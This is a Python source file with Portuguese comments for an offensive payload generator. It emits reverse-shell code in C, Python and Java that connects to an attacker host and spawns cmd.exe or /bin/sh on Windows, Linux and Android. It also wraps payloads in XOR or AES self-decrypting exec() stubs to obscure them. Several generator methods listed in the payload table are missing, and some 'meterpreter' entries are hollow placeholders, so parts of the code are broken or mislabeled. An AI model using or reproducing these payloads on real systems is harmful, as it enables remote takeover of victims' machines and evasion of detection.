import base64
import random
import string
from utils.helpers import print_success, print_error

class PayloadGenerator:
    def __init__(self):
        self.current_payload = None
        self.encoding = "plain"
        self.platform = "windows"
        self.protocol = "tcp"
        
        # Dicionário de payloads por plataforma
        self.payloads = {
            "windows": {
                "meterpreter/reverse_tcp": self.generate_windows_meterpreter_tcp,
                "meterpreter/reverse_http": self.generate_windows_meterpreter_http,
                "meterpreter/reverse_https": self.generate_windows_meterpreter_https,
                "meterpreter/bind_tcp": self.generate_windows_meterpreter_bind_tcp,
                "shell/reverse_tcp": self.generate_windows_shell_tcp,
                "shell/bind_tcp": self.generate_windows_shell_bind_tcp,
            },
            "linux": {
                "meterpreter/reverse_tcp": self.generate_linux_meterpreter_tcp,
                "meterpreter/reverse_http": self.generate_linux_meterpreter_http,
                "meterpreter/bind_tcp": self.generate_linux_meterpreter_bind_tcp,
                "shell/reverse_tcp": self.generate_linux_shell_tcp,
                "shell/bind_tcp": self.generate_linux_shell_bind_tcp,
            },
            "android": {
                "meterpreter/reverse_tcp": self.generate_android_meterpreter_tcp,
                "meterpreter/reverse_http": self.generate_android_meterpreter_http,
                "meterpreter/reverse_https": self.generate_android_meterpreter_https,
            },
            "multi": {
                "python/shell_reverse_tcp": self.generate_python_shell_tcp,
                "python/meterpreter_reverse_tcp": self.generate_python_meterpreter_tcp,
                "java/meterpreter_reverse_http": self.generate_java_meterpreter_http,
            }
        }
        
    def select_payload(self, payload_type):
        # Determinar a plataforma com base no tipo de payload
        if "/" in payload_type:
            platform, payload_name = payload_type.split("/", 1)
            if platform in self.payloads and payload_name in self.payloads[platform]:
                self.current_payload = payload_type
                self.platform = platform
                print_success(f"Payload selecionado: {payload_type}")
                return True
                
        print_error(f"Payload não encontrado: {payload_type}")
        return False
        
    def set_encoding(self, encoding):
        if encoding in ["plain", "base64", "xor", "aes"]:
            self.encoding = encoding
            print_success(f"Encoding definido para: {encoding}")
        else:
            print_error("Encoding deve ser: plain, base64, xor ou aes")
            
    def set_platform(self, platform):
        if platform in ["windows", "linux", "android", "multi"]:
            self.platform = platform
            print_success(f"Plataforma definida para: {platform}")
        else:
            print_error("Plataforma deve ser: windows, linux, android ou multi")
            
    def set_protocol(self, protocol):
        if protocol in ["tcp", "udp", "http", "https"]:
            self.protocol = protocol
            print_success(f"Protocolo definido para: {protocol}")
        else:
            print_error("Protocolo deve ser: tcp, udp, http ou https")
            
    def list_payloads(self, platform=None):
        if platform and platform in self.payloads:
            print(f"Payloads disponíveis para {platform}:")
            for payload in self.payloads[platform].keys():
                print(f"  {platform}/{payload}")
        else:
            print("Payloads disponíveis:")
            for platform, payloads in self.payloads.items():
                print(f"  {platform}:")
                for payload in payloads.keys():
                    print(f"    {payload}")
                    
    def generate_payload(self, lhost, lport):
        if not self.current_payload:
            print_error("Nenhum payload selecionado")
            return None
            
        platform, payload_name = self.current_payload.split("/", 1)
        
        if platform not in self.payloads or payload_name not in self.payloads[platform]:
            print_error(f"Payload não suportado: {self.current_payload}")
            return None
            
        generator = self.payloads[platform][payload_name]
        payload = generator(lhost, lport)
        
        # Aplicar encoding
        if self.encoding == "base64":
            payload = base64.b64encode(payload.encode()).decode()
        elif self.encoding == "xor":
            payload = self.xor_encode(payload)
        elif self.encoding == "aes":
            payload = self.aes_encode(payload)
            
        return payload
        
    # Métodos de geração de payloads para Windows
    def generate_windows_meterpreter_tcp(self, lhost, lport):
        return f"""
// Windows Meterpreter Reverse TCP
#include <Windows.h>
#include <stdio.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

int main() {{
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in sa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    WSAStartup(MAKEWORD(2,2), &wsaData);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("{lhost}");
    sa.sin_port = htons({lport});
    
    WSAConnect(s, (struct sockaddr *)&sa, sizeof(sa), NULL, NULL, NULL, NULL);
    
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();
    
    return 0;
}}
"""
        
    def generate_windows_shell_tcp(self, lhost, lport):
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["cmd.exe","-i"])
"""
    
    # Métodos de geração de payloads para Linux
    def generate_linux_meterpreter_tcp(self, lhost, lport):
        return f"""
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[]) {{
    int sockfd;
    struct sockaddr_in serv_addr;
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons({lport});
    serv_addr.sin_addr.s_addr = inet_addr("{lhost}");
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    execve("/bin/sh", NULL, NULL);
    
    return 0;
}}
"""
        
    def generate_linux_shell_tcp(self, lhost, lport):
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
    
    # Métodos de geração de payloads para Android
    def generate_android_meterpreter_tcp(self, lhost, lport):
        return f"""
// Android Meterpreter Reverse TCP
public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        
        new Thread(new Runnable() {{
            public void run() {{
                try {{
                    String host = "{lhost}";
                    int port = {lport};
                    Socket socket = new Socket(host, port);
                    
                    Process process = Runtime.getRuntime().exec("/system/bin/sh");
                    DataOutputStream outputStream = new DataOutputStream(process.getOutputStream());
                    DataInputStream inputStream = new DataInputStream(process.getInputStream());
                    DataInputStream errorStream = new DataInputStream(process.getErrorStream());
                    
                    while (true) {{
                        // Ler comando do socket
                        // Executar comando no shell
                        // Enviar resultado pelo socket
                    }}
                }} catch (Exception e) {{
                    e.printStackTrace();
                }}
            }}
        }}).start();
    }}
}}
"""
    
    # Métodos de geração de payloads multi-plataforma
    def generate_python_shell_tcp(self, lhost, lport):
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
        
    def generate_python_meterpreter_tcp(self, lhost, lport):
        return f"""
import socket
import struct
import subprocess
import os
import time

# Meterpreter stager em Python
def meterpreter_reverse_tcp(lhost, lport):
    # Código do stager Meterpreter
    # (Implementação simplificada para demonstração)
    print("Meterpreter stager para", lhost, lport)
    
meterpreter_reverse_tcp("{lhost}", {lport})
"""
    
    # Métodos de encoding
    def xor_encode(self, data):
        key = ''.join(random.choice(string.ascii_letters) for _ in range(10))
        encoded = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
        return f"""
key = "{key}"
encoded = "{encoded}"
exec(''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(encoded)))
"""
        
    def aes_encode(self, data):
        # Implementação simplificada de AES (apenas para demonstração)
        import hashlib
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        import base64
        
        key = hashlib.sha256(b"metaseed").digest()
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        
        return f"""
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import hashlib

key = hashlib.sha256(b"metaseed").digest()
iv = base64.b64decode("{iv}")
ct = base64.b64decode("{ct}")

cipher = AES.new(key, AES.MODE_CBC, iv)
pt = unpad(cipher.decrypt(ct), AES.block_size)
exec(pt.decode())
"""
